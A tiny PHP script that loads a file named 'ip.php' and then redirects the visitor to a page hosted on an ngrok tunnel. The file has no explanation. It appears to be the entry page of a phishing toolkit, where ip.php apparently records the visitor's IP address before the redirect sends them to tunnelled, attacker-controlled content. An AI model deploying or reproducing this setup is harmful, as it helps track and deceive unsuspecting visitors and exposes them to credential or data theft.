<?php
include 'ip.php';
header('Location: https://b5dc25cc7b2b.ngrok.io/index2.html');
exit
?>
